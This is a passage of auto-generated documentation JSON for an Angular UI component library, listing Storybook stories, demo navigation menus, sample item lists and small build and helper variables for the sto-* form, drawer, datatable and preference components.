          "file": "libs/form/src/lib/sto-option-select-all/sto-option-select-all.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Story<any>",
          "defaultValue": "(args) => ( {\n  props: {\n    selected: [ 1, 2 ],\n    isFilter: true,\n    focusIfNoValue: false,\n    items,\n    total: items.length,\n    valueChange: (event: any) => console.log(event),\n    ctrl: new UntypedFormControl([ 1, 2 ])\n  }, template: `\n<mat-card style=\"width: 300px\" class=\"sto-form\" >\n  <mat-form-field stoFormField\n                  floatLabel=\"always\" >\n    <mat-label>Multiselect with filter</mat-label>\n    <mat-select [multiple]=\"true\"\n    [formControl]=\"ctrl\"\n                (selectionChange)=\"valueChange($event)\"\n                [value]=\"selected\">\n      <sto-option-select-all></sto-option-select-all>\n      <mat-option *ngFor=\"let opt of items\"\n                  [value]=\"opt.id\">{{opt.name}}</mat-option>\n    </mat-select>\n  </mat-form-field>\n</mat-card>`\n} )"
        }
      ],
      "libs/form/src/lib/sto-select-filter/item-list.ts": [
        {
          "name": "items",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/form/src/lib/sto-select-filter/item-list.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "[]",
          "defaultValue": "[\n  {id: 1, name: 'TEST1', longName: 'LONG TEST1'},\n  {id: 2, name: 'TEST2', longName: 'LONG TEST2'},\n  {id: 3, name: 'TEST3', longName: 'LONG TEST3'},\n  {id: 4, name: 'TEST4', longName: 'LONG TEST4'},\n  {id: 5, name: 'TEST5', longName: 'LONG TEST5'},\n  {id: 6, name: 'TEST6', longName: 'LONG TEST6'},\n  {id: 7, name: 'TEST7', longName: 'LONG TEST7'},\n  {id: 8, name: 'TEST8', longName: 'LONG TEST8'},\n  {id: 9, name: 'TEST9', longName: 'LONG TEST9'},\n  {id: 10, name: 'TEST10', longName: 'LONG TEST10'},\n]"
        }
      ],
      "libs/form/src/lib/sto-select-filter/mat-select-filter.stories.ts": [
        {
          "name": "MultiSelect",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/form/src/lib/sto-select-filter/mat-select-filter.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Story<any>",
          "defaultValue": "(args) => ( {\n  props: { ...args }, template: `\n<mat-card style=\"width: 300px\" class=\"sto-form\" >\n  <mat-form-field class=\"sto-form__field\"\n                  floatLabel=\"always\" >\n    <mat-label>Multiselect with filter</mat-label>\n    <mat-select [multiple]=\"true\"\n                (selectionChange)=\"valueChange($event)\"\n                [value]=\"selected\">\n      <sto-select-filter (keydown.space)=\"$event.stopPropagation()\"\n                         [selected]=\"select?.length\"\n                         [isFilter]=\"true\"\n                         [focusIfNoValue]=\"focusIfNoValue\"\n                         [isMulti]=\"true\"\n                         (valueChanges)=\"filteredItems = filter($event, allItems)\"\n                         (selectAll)=\"selected = $event ? filteredItems :[]; selectAll($event)\"></sto-select-filter>\n      <mat-option *ngFor=\"let opt of filteredItems\"\n                  [value]=\"opt\">{{opt.name}}</mat-option>\n    </mat-select>\n  </mat-form-field>\n</mat-card>`\n} )"
        },
        {
          "name": "SingleSelect",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/form/src/lib/sto-select-filter/mat-select-filter.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Story<Record<string, >>",
          "defaultValue": "(args) => ( {\n  props: { ...args },\n  template: `\n<mat-card style=\"width: 300px\" class=\"sto-form\" >\n    <mat-form-field  class=\"sto-form__field\" floatLabel=\"always\">\n    <mat-label>Select with filter</mat-label>\n      <mat-select [multiple]=\"false\" [value]=\"selected\">\n        <sto-select-filter (keydown.space)=\"$event.stopPropagation()\"\n                           [isFilter]=\"isFilter\"\n                           [focusIfNoValue]=\"focusIfNoValue\"\n                           [isMulti]=\"false\"\n                           (valueChanges)=\"filteredItems = filter($event, allItems)\"></sto-select-filter>\n        <mat-option *ngFor=\"let opt of filteredItems\"\n                    [value]=\"opt\">{{opt.name}}</mat-option>\n      </mat-select>\n    </mat-form-field>\n</mat-card>`\n} )"
        }
      ],
      "libs/drawer/src/lib/sto-navigation/navigation.ts": [
        {
          "name": "navigation",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/drawer/src/lib/sto-navigation/navigation.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "object",
          "defaultValue": "{\n  'name': 'Web applications',\n  'groups': [\n    {\n      'name': 'Application 1',\n      'items': [\n        {\n          'id': 'a11',\n          'name': 'Application 1.1',\n          'svgIcon': false,\n          'icon': 'build',\n          'command': {\n            'type': 'navigate',\n            'arguments': [\n              'a11'\n            ]\n          }\n        },\n        {\n          'id': 'a12',\n          'name': 'Application 1.2',\n          'svgIcon': false,\n          'icon': 'attach_money',\n          'command': {\n            'type': 'navigate',\n            'arguments': [\n              'a12'\n            ]\n          }\n        }\n      ]\n    },\n    {\n      'name': 'Application 2',\n      'external': false,\n      'items': [\n        {\n          'id': 'a2',\n          'name': 'Application 2',\n          'svgIcon': false,\n          'icon': 'train',\n          'command': {\n            'type': 'navigate',\n            'arguments': [\n              'a2'\n            ]\n          }\n        }\n      ]\n    },\n    {\n      'name': 'Application 3',\n      'items': [\n        {\n          'id': 'a3',\n          'name': 'Application 3',\n          'svgIcon': false,\n          'icon': 'local_library',\n          'command': {\n            'type': 'externalLinkNewWindow',\n            'arguments': []\n          }\n        }\n      ]\n    }\n  ]\n}"
        },
        {
          "name": "subNavigation",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/drawer/src/lib/sto-navigation/navigation.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "object",
          "defaultValue": "{\n  'name': 'Application 2',\n  'groups': [\n    {\n      'name': null,\n      'items': [\n        {\n          'icon': 'date_range',\n          'name': 'Section 1',\n          'command': {\n            'type': 'internalLink',\n            'arguments': [\n              '1'\n            ]\n          },\n          'svgIcon': false,\n          'subItems': []\n        },\n        {\n          'icon': 'format_list_bulleted',\n          'name': 'Section 2',\n          'command': {\n            'type': 'internalLink',\n            'arguments': [\n              '2'\n            ]\n          },\n          'svgIcon': false,\n          'subItems': []\n        },\n        {\n          'icon': 'train',\n          'name': 'Section 3',\n          'command': {\n            'type': 'internalLink',\n            'arguments': [\n              '3'\n            ]\n          },\n          'svgIcon': false,\n          'subItems': []\n        },\n        {\n          'icon': 'access_time',\n          'name': 'Section 4',\n          'command': {\n            'type': 'internalLink',\n            'arguments': [\n              '4'\n            ]\n          },\n          'svgIcon': false,\n          'subItems': []\n        },\n        {\n          'icon': 'description',\n          'name': 'Section 5',\n          'command': {\n            'type': 'internalLink',\n            'arguments': [\n              '5'\n            ]\n          },\n          'svgIcon': false,\n          'subItems': []\n        }\n      ],\n      'hasDivider': false,\n      'svgIcon': false,\n      'icon': null\n    },\n    {\n      'name': null,\n      'items': [\n        {\n          'icon': 'train',\n          'name': 'SubSection 1',\n          'command': {\n            'type': 'internalLink',\n            'arguments': [\n              '11'\n            ]\n          },\n          'svgIcon': false,\n          'subItems': []\n        },\n        {\n          'icon': 'person',\n          'name': 'SubSection 2',\n          'command': {\n            'type': 'internalLink',\n            'arguments': [\n              '12'\n            ]\n          },\n          'svgIcon': false,\n          'subItems': []\n        },\n        {\n          'icon': 'business',\n          'name': 'SubSection 3',\n          'command': {\n            'type': 'internalLink',\n            'arguments': [\n              'SubSection 13'\n            ]\n          },\n          'svgIcon': false,\n          'subItems': []\n        },\n        {\n          'icon': 'settings',\n          'name': 'SubSection 4',\n          'command': {\n            'type': 'internalLink',\n            'arguments': [\n              '4'\n            ]\n          },\n          'svgIcon': false,\n          'subItems': []\n        }\n      ],\n      'hasDivider': true,\n      'svgIcon': false,\n      'icon': null\n    }\n  ]\n}"
        }
      ],
      "libs/common/src/lib/sto-breadcrumbs/breadcrumb.ts": [
        {
          "name": "NAVIGATION_HOME_ICON",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/common/src/lib/sto-breadcrumbs/breadcrumb.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "defaultValue": "new InjectionToken<BreadcrumbConfig>('sto-home-icon')"
        }
      ],
      "libs/drawer/src/lib/nav-drawer/nav-drawer.stories.ts": [
        {
          "name": "navigationItems",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/drawer/src/lib/nav-drawer/nav-drawer.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "defaultValue": "[\n  {\n    label: 'Direct route',\n    route: [ '/', 'home' ],\n    icon: 'home'\n  },\n  {\n    label: 'Disabled',\n    route: [ '/', 'home' ],\n    icon: 'do_disturb',\n    disabled: true\n  },\n  {\n    label: 'Internal route title',\n    children: [\n      {\n        route: [ '/', 'disabled', 'route1' ],\n        disabled: true,\n        label: 'Disabled child route',\n      },\n      {\n        route: [ '/', 'route1' ],\n        label: 'Internal child route',\n      },\n      {\n        route: [ '/', 'route2' ],\n        label: 'Internal child route 2',\n      },\n      {\n        route: [ '/', 'route3' ],\n        label: 'Internal child route 3',\n      },\n      {\n        route: [ '/', 'route4' ],\n        label: 'Internal child route 4',\n      },\n      {\n        route: [ '/', 'route5' ],\n        label: 'Internal child route 5',\n      },\n      {\n        route: [ '/', 'route6' ],\n        label: 'Internal child route 6',\n      },\n    ],\n    icon: 'dashboard',\n    title: 'Dashboard'\n  },\n  {\n    label: 'External',\n    divider: 'above',\n    children: [\n      {\n        link: 'https://example.com',\n        target: '_blank',\n        label: 'Example.com',\n      }\n    ],\n    icon: 'open_in_new',\n  },\n  {\n    link: '#',\n    label: 'Disabled Route',\n    children: [],\n    icon: 'do_disturb',\n    disabled: true\n  },\n] as Array<Navigation>"
        },
        {
          "name": "NormalUse",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/drawer/src/lib/nav-drawer/nav-drawer.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "defaultValue": "Template.bind({})"
        },
        {
          "name": "Template",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/drawer/src/lib/nav-drawer/nav-drawer.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Story<NavDrawerComponent>",
          "defaultValue": "(args: NavDrawerComponent) => {\n  return {\n    component: NavDrawerComponent,\n    props: {\n      ...args,\n      activate: action('Activate route')\n    },\n  };\n}"
        },
        {
          "name": "WithAppHeader",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/drawer/src/lib/nav-drawer/nav-drawer.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "defaultValue": "(args: NavDrawerComponent) => {\n  return {\n    component: NavDrawerComponent,\n    props: { ...args, activate: action('Activate route') },\n    template: `\n    <sto-app-header></sto-app-header>\n    <sto-nav-drawer (activate)=\"collapsed = true; activate($event)\" [withAppHeader]=\"true\" [navigationItems]=\"navigationItems\" [collapsed]=\"collapsed\"></sto-nav-drawer>\n    `\n  };\n}"
        }
      ],
      "libs/error-handler/src/lib/error-handler.stories.ts": [
        {
          "name": "NormalUse",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/error-handler/src/lib/error-handler.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "defaultValue": "Template.bind({})"
        },
        {
          "name": "Template",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/error-handler/src/lib/error-handler.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Story<Record<string, >>",
          "defaultValue": "(args: Record<string, unknown> ) => {\n  return {\n    props: args,\n    template: `<next-wrapper></next-wrapper>`,\n  };\n}"
        }
      ],
      "libs/datatable/src/lib/datatable.stories.ts": [
        {
          "name": "NormalUse",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/datatable/src/lib/datatable.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Story<StoDatatableComponent<Record<string, >>>",
          "defaultValue": "(args: StoDatatableComponent<Record<string, unknown>>) => {\n  return {\n    component: StoDatatableComponent,\n    props: {\n      ...args, columns: args.scrollbarH ? [ ...columns, ...columns, ...columns ] : columns,\n      rows: rows,\n      headerContextMenu: action('Header context menu'),\n      rowContextMenu: action('Row context menu'),\n      rowActivate: action('Keyboard-activation on row'),\n      select: action('Row selected'),\n      resized: action('Resize'),\n      trackBy: (index: number) => index\n    },\n  };\n}"
        }
      ],
      "libs/datatable/src/lib/swimlane-table.stories.ts": [
        {
          "name": "NormalUse",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/datatable/src/lib/swimlane-table.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "defaultValue": "Template.bind({})"
        },
        {
          "name": "Template",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/datatable/src/lib/swimlane-table.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Story<Record<string, >>",
          "defaultValue": "(args: Record<string, unknown>) => {\n  return {\n    props: args,\n    template: `<mat-card>\n<mat-card-title><h2>This replaces StoComplexDatatable and is only here for CSS</h2></mat-card-title>\n<ngx-datatable [loadingIndicator]=\"loading\"\n[footerHeight]=\"40\"\n[selectionType]=\"'single'\"\n[scrollbarV]=\"true\"\n[scrollbarH]=\"horizontalScroll\"\n[style.height.px]=\"height\"\n[rowHeight]=\"rowHeight\"\n[headerHeight]=\"headerHeight\"\n[class.sto-datatable]=\"withCss\"\n[rows]=\"rows\"\n[columns]=\"columns\"></ngx-datatable>\n</mat-card>`\n  };\n}"
        }
      ],
      "libs/drawer/src/lib/sto-drawer/drawer.stories.ts": [
        {
          "name": "NormalUse",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/drawer/src/lib/sto-drawer/drawer.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "defaultValue": "Template.bind({})"
        },
        {
          "name": "Template",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/drawer/src/lib/sto-drawer/drawer.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Story<StoDrawerComponent>",
          "defaultValue": "(args: StoDrawerComponent) => {\n  return {\n    component: StoDrawerComponent,\n    props: args,\n    template: `\n  <div>\n  <sto-drawer [position]=\"'right'\" [open]=\"true\" [animation]=\"animation\" [backdrop]=\"backdrop\">\n<sto-drawer-header>\n<div class=\"sto-drawer__header__title\">\n<h2>Title</h2>\n      </div>\n</sto-drawer-header>\n\n<mat-card class=\"sto-card\"><p>Content in drawer</p></mat-card>\n\n<sto-drawer-footer>\n<button mat-button color=\"primary\">Save</button>\n</sto-drawer-footer>\n</sto-drawer>\n\n\n<mat-card class=\"sto-card sto-form\">\n<button mat-raised-button>Open</button>\n</mat-card>\n<mat-card class=\"sto-card sto-form\">\n<mat-card-title class=\"sto-card__title\">Content title</mat-card-title>\n</mat-card>\n</div>\n`,\n\n  };\n}"
        }
      ],
      "libs/drawer/src/lib/sto-navigation/navigation.stories.ts": [
        {
          "name": "NormalUse",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/drawer/src/lib/sto-navigation/navigation.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "defaultValue": "Template.bind({})"
        },
        {
          "name": "Template",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/drawer/src/lib/sto-navigation/navigation.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Story<>",
          "defaultValue": "(args: StoDrawerComponent) => {\n  const actions = {\n    handleCommand: action('Link pressed'),\n    topsNav: action('Open tops landing'),\n    toggle: action('Switch side'),\n    closeMenu: action('Close menu'),\n  };\n  return {\n    component: StoDrawerComponent,\n    props: { ...args, ...actions, navigation, subNavigation },\n    template: `<div>\n  <sto-drawer [open]=\"open\" [animation]=\"animation\" [backdrop]=\"backdrop\">\n<sto-drawer-header>\n<div class=\"sto-drawer__header__infix\">\n        <button *ngIf=\"activePane === 'right'; else topIcon\"\n                type=\"button\"\n                mat-icon-button\n                (click)=\"toggle(); activePane = 'left'\">\n          <mat-icon>arrow_back</mat-icon>\n        </button>\n        <ng-template #topIcon>\n          <button mat-icon-button\n          type=\"button\"\n          (click)=\"topsNav()\">\n            <mat-icon [class.sto-main-icon--test-environment]=\"testEnvironment\">settings</mat-icon>\n          </button>\n        </ng-template>\n      </div>\n<div class=\"sto-drawer__header__title\">\n        <ng-container *ngIf=\"activePane === 'right'; else leftName;\">\n          <span *ngIf=\"activePane === 'right'\">\n           {{rightMenu.name}}\n         </span>\n        </ng-container>\n        <ng-template #leftName>\n         <span *ngIf=\"activePane === 'left'\">\n           {{leftMenu.name}}\n         </span>\n        </ng-template>\n      </div>\n      <div class=\"sto-drawer__header__suffix\">\n        <button type=\"button\"\n                mat-icon-button\n                (click)=\"closeMenu(); open = false\">\n          <mat-icon>close</mat-icon>\n        </button>\n      </div>\n</sto-drawer-header>\n<sto-slide-panel class=\"sto-slide-panel\"\n                     [activePane]=\"activePane\">\n                     {{activePane}}\n<sto-navigation-menu [menu]=\"subNavigation\"\n*ngIf=\"activePane === 'right'\"\n                         (onCommand)=\"handleCommand('internal', $event.command)\"\n                         rightPane></sto-navigation-menu>\n<sto-navigation-menu [menu]=\"navigation\"\n*ngIf=\"activePane === 'left'\"\n                         (onCommand)=\"activePane = 'right'; handleCommand('root', $event.command)\"\n                         leftPane></sto-navigation-menu>\n                         </sto-slide-panel>\n</sto-drawer>\n\n\n<mat-card class=\"sto-card sto-form\">\n<mat-card-title class=\"sto-card__title\">Content title</mat-card-title>\n</mat-card>\n<mat-card class=\"sto-card sto-form\">\n<mat-card-title class=\"sto-card__title\">Content title</mat-card-title>\n</mat-card>\n</div>`\n  };\n}"
        }
      ],
      "libs/datatable/src/lib/sto-datatable/observer.ts": [
        {
          "name": "observeWidth",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/datatable/src/lib/sto-datatable/observer.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "defaultValue": "(el: HTMLElement) => {\n  return new Observable<number>(subscriber => {\n    const cb = (entries: ResizeObserverEntry[]) => {\n      const entry = entries.find(e => e.contentRect);\n      const rect = entry?.contentRect;\n      subscriber.next(rect?.width);\n    };\n    const observer = new ResizeObserver(cb);\n    observer.observe(el);\n    return () => {\n      observer.disconnect();\n    };\n  });\n}"
        }
      ],
      "tools/scripts/build-scss.ts": [
        {
          "name": "out",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "tools/scripts/build-scss.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "defaultValue": "path.join(root, 'dist', 'libs', 'core')"
        },
        {
          "name": "promises",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "tools/scripts/build-scss.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "[]",
          "defaultValue": "[\n  processScss('./libs/core/src/ngx-stoui.scss', path.join(out, 'ngx-stoui.css')),\n  processScss('./libs/core/src/style/datatable/ngx-datatable.scss', path.join(out, 'ngx-datatable.css')),\n]"
        },
        {
          "name": "root",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "tools/scripts/build-scss.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "defaultValue": "path.join(__dirname, '../../')"
        },
        {
          "name": "writeFile",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "tools/scripts/build-scss.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "defaultValue": "promisify(writeFileCb)"
        }
      ],
      "libs/form/src/lib/number-input/number-input.pipe.ts": [
        {
          "name": "PADDING",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/form/src/lib/number-input/number-input.pipe.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "defaultValue": "'000000000'"
        }
      ],
      "libs/core/src/lib/sto-user-preference/sto-user-preference.service.ts": [
        {
          "name": "preferenceKey",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/core/src/lib/sto-user-preference/sto-user-preference.service.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "defaultValue": "'TOPS_IM:UserPreferences'"
        }
      ],
      "libs/common/src/lib/preference-manager/preference-manager.stories.ts": [
        {
          "name": "preferences",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/common/src/lib/preference-manager/preference-manager.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Preference[]",
          "defaultValue": "[\n  { name: 'A filter', id: 'uuid', identifierKey: 'reports_filter', user: 'Bobby B', payload: {} },\n  { name: 'Another filter', id: 'uuid-2', identifierKey: 'reports_filter', user: 'Bobby B', default: true, payload: {} },\n]"
        },
        {
          "name": "Usage",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/common/src/lib/preference-manager/preference-manager.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Story<PreferenceManagerComponent>",
          "defaultValue": "(args: PreferenceManagerComponent) => {\n  return {\n    props: {\n      ...args,\n      filterForm: new UntypedFormControl(),\n      onSelect: function (id: string) {\n        this.activePreferenceId = id;\n        this.filterForm.reset();\n        action('Select preference')(id);\n      },\n      onSetDefault: function (pref: Preference) {\n        const preferences = this.preferences as Preference[];\n        const index = preferences.findIndex(p => p.id === pref.id);\n        const prefs: Preference[] = [ ...preferences ].map(p => ( { ...p, default: false } ));\n        prefs[ index ] = pref;\n        this.loadingIndicator = true;\n        action('Set default preference')(pref.name);\n        setTimeout(() => {\n          this.preferences = prefs;\n          this.loadingIndicator = false;\n        }, 300);\n      },\n      onEdit: function (pref: Preference) {\n        const preferences = this.preferences as Preference[];\n        const index = preferences.findIndex(p => p.id === pref.id);\n        const prefs = [ ...preferences ];\n        prefs[ index ] = pref;\n        // Set preference in payload\n        this.loadingIndicator = true;\n        this.filterForm.markAsPristine();\n        action('Edit preference')(`${pref.name} with id ${pref.id}`);\n\n        setTimeout(() => {\n          this.preferences = prefs;\n          this.loadingIndicator = false;\n        }, 300);\n      },\n      onDeletePreference: function (id: string) {\n        action('Delete preference')(id);\n        const preferences = this.prerences as Preference[];\n        const index = preferences.findIndex(p => p.id === id);\n        const prefs = [ ...preferences ];\n        prefs.splice(index, 1);\n        this.preferences = prefs;\n      },\n      onAdd: function (preference: Preference) {\n        action('Create preference')(preference);\n        preference.id = Date.now().toString(10);\n        this.preferences = [ ...this.preferences, preference ];\n      }\n    },\n    component: PreferenceManagerComponent,\n    template: `\n<sto-filter-panel [expandable]=\"true\" [expanded]=\"true\">\n  <sto-filter-title><sto-preference-manager [loadingIndicator]=\"loadingIndicator\"\n                                            (editPreference)=\"onEdit($event)\"\n                                            (addNewPreference)=\"onAdd($event)\"\n                                            [dirty]=\"filterForm.dirty\"\n                                            (deletePreference)=\"onDeletePreference($event)\"\n                                            (selectPreference)=\"onSelect($event)\"\n                                            (setDefaultPreference)=\"onSetDefault($event)\"\n                                            [activePreferenceId]=\"activePreferenceId\"\n                                            [preferences]=\"preferences\"></sto-preference-manager></sto-filter-title>\n  <input [formControl]=\"filterForm\" placeholder=\"Write stuff here to trigger modified\">\n  <button (click)=\"filterForm.reset(); filterForm.markAsPristine()\">And click to clear</button>\n</sto-filter-panel>\n\n<sto-preference-manager [loadingIndicator]=\"loadingIndicator\"\n                                            (editPreference)=\"onEdit($event)\"\n                                            (addNewPreference)=\"onAdd($event)\"\n                                            [dirty]=\"filterForm.dirty\"\n                                            (deletePreference)=\"onDeletePreference($event)\"\n                                            (selectPreference)=\"onSelect($event)\"\n                                            (setDefaultPreference)=\"onSetDefault($event)\"\n                                            [activePreferenceId]=\"activePreferenceId\"\n                                            [preferences]=\"preferences\"></sto-preference-manager>\n`\n  };\n}"
        }
      ],
      "apps/oilmod-web/src/app/app.component.stories.ts": [
        {
          "name": "primary",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "apps/oilmod-web/src/app/app.component.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "defaultValue": "() => ({\n  moduleMetadata: {\n    imports: []\n  },\n  props: {\n  }\n})"
        }
      ],
      "libs/core/src/lib/styles.stories.ts": [
        {
          "name": "StoCard",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/core/src/lib/styles.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Story<literal type>",
          "defaultValue": "(args) => ( {\n  props: { ...args },\n  template: `<mat-card [class.sto-card]=\"withStyles\">\n<mat-card-title [class.sto-card__title]=\"withStyles\">Card Title</mat-card-title>\n<mat-card-subtitle [class.sto-card__subtitle]=\"withStyles\">Card Subtitle</mat-card-subtitle>\n<mat-card-content [class.sto-card__content]=\"withStyles\">Card Content In Here</mat-card-content>\n</mat-card>`\n} )"
        },
        {
          "name": "StoDialog",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/core/src/lib/styles.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Story<Record<string, >>",
          "defaultValue": "(args) => ( {\n  props: { ...args },\n  template: `<app-dialog-demo [separatorLines]=\"separatorLines\"></app-dialog-demo>`,\n} )"
        },
        {
          "name": "StoTheme",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/core/src/lib/styles.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Story<Record<string, >>",
          "defaultValue": "args => ( {\n  props: { ...args, colors: [ 'primary', 'accent', 'warn', 'warning', 'success', 'danger' ] },\n  styles: [\n    `\n    .container { display: flex; }\n    .container > div {\n     flex: 0 1 auto;\n     padding-left: 16px;\n     }\n    `\n  ],\n  template: `\n  <mat-tab-group>\n  <mat-tab label=\"Buttons\">\n    <mat-card class=\"sto-card\">\n    <div *ngFor=\"let color of colors\">\n      <mat-card-subtitle class=\"sto-card__subtitle\">\n    <h2>{{ color }}</h2>\n</mat-card-subtitle>\n    <button mat-button [color]=\"color\">Mat Button</button>\n    <button mat-stroked-button [color]=\"color\">Mat stroked Button</button>\n    <button mat-flat-button [color]=\"color\">Mat flat Button</button>\n    <button mat-raised-button [color]=\"color\">Mat raised Button</button>\n    <button mat-icon-button [color]=\"color\"><mat-icon>home</mat-icon></button>\n</div>\n</mat-card>\n  </mat-tab>\n  <mat-tab label=\"Cards\">\n  <mat-card *ngFor=\"let c of colors\" [ngClass]=\"'mat-' + c\">\n  <mat-card-title>{{ c }}</mat-card-title>\n</mat-card>\n</mat-tab>\n<mat-tab label=\"Text\">\n<mat-card class=\"sto-card\">\n    <div class=\"container\">\n    <div>\n    <p *ngFor=\"let color of colors\" [ngClass]=\"'mat-' + color\">&lt;p&gt; {{ color }}</p>\n</div>\n<div>\n    <span *ngFor=\"let color of colors\" style=\"display: block\" [ngClass]=\"'mat-' + color\">\n    &lt;span&gt; {{ color }}\n</span>\n</div>\n<div>\n    <h2 *ngFor=\"let color of colors\" style=\"display: block\" [ngClass]=\"'mat-' + color\">\n    &lt;h[1|2|3|4|5]&gt; {{ color }}\n</h2>\n</div>\n</div>\n</mat-card>\n</mat-tab>\n</mat-tab-group>\n  `,\n} )"
        }
      ],
      "libs/core/src/lib/sto-directives/directives.stories.ts": [
        {
          "name": "StoContextMenu",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/core/src/lib/sto-directives/directives.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "defaultValue": "() => ( {\n  props: {\n    closed: action('Menu closed'),\n    log: action('Active menu info')\n  },\n  template: `<mat-card>\n<mat-card-title>Context menu</mat-card-title>\n  <button\n#overlay=\"stoMenuOverlay\"\n[matMenuTriggerRestoreFocus]=\"false\"\n(menuClosed)=\"closed()\"\nmat-button stoMenuOverlay #trigger=\"matMenuTrigger\" [matMenuTriggerFor]=\"menu\">Menu trigger button</button>\n<br>\n<br>\n<p>\n  Active Menu Index {{ activeMenuInfo }}\n</p>\n<br>\n<br>\n<div style=\"width: 500px; display: flex; justify-content: space-between\">\n<span [menuContext]=\"{index: 0}\" [overlayDirective]=\"overlay\" [menuTrigger]=\"trigger\" stoContextMenu>Context 0</span>\n<span [menuContext]=\"{index: 1}\" [overlayDirective]=\"overlay\" [menuTrigger]=\"trigger\" stoContextMenu>Context 1</span>\n<span [menuContext]=\"{index: 2}\" [overlayDirective]=\"overlay\" [menuTrigger]=\"trigger\" stoContextMenu>Context 2</span>\n<span [menuContext]=\"{index: 3}\" [overlayDirective]=\"overlay\" [menuTrigger]=\"trigger\" stoContextMenu>Context 3</span>\n</div>\n\n<mat-menu [backdropClass]=\"'backdrop-remove'\" [hasBackdrop]=\"false\" #menu=\"matMenu\">\n  <ng-template matMenuContent let-index=\"index\">\n    <button mat-menu-item (click)=\"activeMenuInfo = index; log('index', index, $event)\">Index {{ index }}</button>\n    <button mat-menu-item (click)=\"activeMenuInfo = index; log(1, $event)\">Item 1</button>\n    <button mat-menu-item (click)=\"activeMenuInfo = index; log(2, $event)\">Item 2</button>\n  </ng-template>\n</mat-menu>\n</mat-card>`\n} )"
        },
        {
          "name": "StoGrid",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/core/src/lib/sto-directives/directives.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
